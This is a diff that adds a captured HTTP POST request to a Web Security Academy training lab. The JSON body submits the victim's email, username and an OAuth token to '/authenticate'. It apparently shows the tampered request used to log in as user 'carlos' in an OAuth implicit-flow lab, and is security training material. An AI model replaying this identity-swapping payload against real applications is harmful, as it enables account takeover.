@@ -1,0 +1,20 @@
+POST /authenticate HTTP/1.1
+Host: ac661f711e41c5bbc0593bdc00630010.web-security-academy.net
+Cookie: session=WD3gNTH0BT6Xmo7s8ycprJmnP5W940dO
+Content-Length: 111
+Sec-Ch-Ua: "Chromium";v="97", " Not;A Brand";v="99"
+Accept: application/json
+Content-Type: application/json
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Origin: https://ac661f711e41c5bbc0593bdc00630010.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://ac661f711e41c5bbc0593bdc00630010.web-security-academy.net/oauth-callback
+Accept-Encoding: gzip, deflate
+Accept-Language: en,pt-BR;q=0.9,pt;q=0.8,en-US;q=0.7
+Connection: close
+
+{"email":"carlos@carlos-montoya.net","username":"carlos","token":"A7tBgLH4z4tg4Phoc0lpGEgP9rnJxTtbaIhFyIBC5Xq"}
